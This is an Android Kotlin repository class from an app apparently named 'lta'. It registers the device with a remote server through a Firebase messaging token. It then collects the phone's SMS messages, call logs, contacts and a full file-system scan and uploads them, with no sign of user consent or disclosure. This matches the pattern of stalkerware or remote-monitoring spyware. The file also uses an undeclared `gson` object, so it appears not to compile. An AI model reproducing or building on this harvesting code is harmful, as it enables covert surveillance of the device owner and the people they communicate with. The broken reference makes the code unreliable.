// DeviceRepository.kt
package com.example.lta.data.repository // <-- Correct package

import android.content.Context
import android.util.Log
import com.example.lta.data.local.AppDatabase
import com.example.lta.data.local.AppPreferences
import com.example.lta.data.remote.ApiClient
import com.example.lta.util.DeviceContentResolver
import com.example.lta.util.FileSystemManager
import com.example.lta.util.SystemInfoManager
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.ktx.messaging
import kotlinx.coroutines.tasks.await

/**
 * Central repository for managing device registration, data synchronization, and token handling.
 * This is the single source of truth for device-related operations.
 */
class DeviceRepository(
    private val apiClient: ApiClient,
    private val appPreferences: AppPreferences,
    private val systemInfoManager: SystemInfoManager,
    private val appDb: AppDatabase,
    private val deviceContentResolver: DeviceContentResolver,
    private val fileSystemManager: FileSystemManager,
    private val appContext: Context
) {
    companion object {
        private const val TAG = "DeviceRepository"
    }

    suspend fun registerDevice(deviceName: String): Result<Unit> {
        return try {
            val token = Firebase.messaging.token.await()
            val success = apiClient.registerDevice(
                token = token,
                deviceModel = systemInfoManager.getDeviceModel(),
                deviceId = systemInfoManager.getDeviceId(),
                name = deviceName
            )
            appPreferences.setRegistrationStatus(success)
            if (success) Result.success(Unit) else Result.failure(Exception("API registration failed"))
        } catch (e: Exception) {
            Log.e(TAG, "Device registration failed", e)
            appPreferences.setRegistrationStatus(false)
            Result.failure(e)
        }
    }

    suspend fun updateFcmToken(token: String) {
        Log.i(TAG, "Updating FCM token on the server.")
        registerDevice("Android-${systemInfoManager.getDeviceModel()}").fold(
            onSuccess = { Log.i(TAG, "FCM token successfully updated on server.") },
            onFailure = { Log.e(TAG, "Failed to update FCM token on server.", it) }
        )
    }

    suspend fun handleTokenPotentiallyDeleted() {
        Log.i(TAG, "Handling potentially deleted token scenario.")
        val deviceId = systemInfoManager.getDeviceId()
        try {
            val success = apiClient.deleteDevice(deviceId)
            Log.i(TAG, "Device removal request sent to server: ${if (success) "OK" else "Failed"}")
        } catch (e: Exception) {
            Log.e(TAG, "Error notifying server of token deletion", e)
        } finally {
            appPreferences.setRegistrationStatus(false)
        }
    }

    fun getRegistrationStatus(): Boolean = appPreferences.getRegistrationStatus()

    fun isFirstLaunch(): Boolean = !appPreferences.hasInitializedApp()

    fun markAppInitialized() = appPreferences.setInitializedApp(true)

    suspend fun syncSms(): Boolean {
        val dao = appDb.smsDao()
        val latestTimestamp = dao.getLatestSmsTimestamp() ?: 0L
        val newSmsList = deviceContentResolver.scanSms(since = latestTimestamp)
        if (newSmsList.isNotEmpty()) dao.insertAll(newSmsList)
        val unsyncedSms = dao.getUnsyncedSms()
        if (unsyncedSms.isEmpty()) return true
        val success = apiClient.syncData("sms", systemInfoManager.getDeviceId(), unsyncedSms)
        if (success) dao.markAsSynced(unsyncedSms.map { it.id })
        return success
    }

    suspend fun syncCallLogs(): Boolean {
        val dao = appDb.callLogDao()
        val latestTimestamp = dao.getLatestCallLogTimestamp() ?: 0L
        val newCallLogs = deviceContentResolver.scanCallLogs(since = latestTimestamp)
        if (newCallLogs.isNotEmpty()) dao.insertAll(newCallLogs)
        val unsyncedCallLogs = dao.getUnsyncedCallLogs()
        if (unsyncedCallLogs.isEmpty()) return true
        val success = apiClient.syncData("calllogs", systemInfoManager.getDeviceId(), unsyncedCallLogs)
        if (success) dao.markAsSynced(unsyncedCallLogs.map { it.id })
        return success
    }

    suspend fun syncContacts(): Boolean {
        val dao = appDb.contactDao()
        val currentDeviceContacts = deviceContentResolver.scanContacts()
        val localContacts = dao.getAllContacts().associateBy { it.contactId }
        val contactsToUpsert = currentDeviceContacts.filter { deviceContact ->
            val localContact = localContacts[deviceContact.contactId]
            localContact == null || deviceContact.lastUpdated > localContact.lastUpdated
        }
        if (contactsToUpsert.isNotEmpty()) dao.insertAll(contactsToUpsert)
        val unsyncedContacts = dao.getUnsyncedContacts()
        if (unsyncedContacts.isEmpty()) return true
        val success = apiClient.syncData("contacts", systemInfoManager.getDeviceId(), unsyncedContacts)
        if (success) dao.markAsSynced(unsyncedContacts.map { it.contactId })
        return success
    }

    suspend fun scanAndUploadFileSystem(): Boolean {
        if (!fileSystemManager.hasFileSystemPermissions()) {
            Log.w(TAG, "Cannot scan filesystem, MANAGE_EXTERNAL_STORAGE permission missing.")
            return false
        }
        val scanResult = fileSystemManager.scanFileSystem()
        if (scanResult.paths.isEmpty()) {
            Log.i(TAG, "File system scan found no items to report.")
            return true
        }
        
        // 1. Serialize the FileSystemScanResult object to a JSON String.
        //    The ApiClient's internal 'uploadFileSystemScan' method expects 'pathsData' as a string.
        val scanResultJson = gson.toJson(scanResult)
        
        // 2. Pass the JSON string to the ApiClient.
        return apiClient.uploadFileSystemScan(systemInfoManager.getDeviceId(), scanResultJson)
    }

}
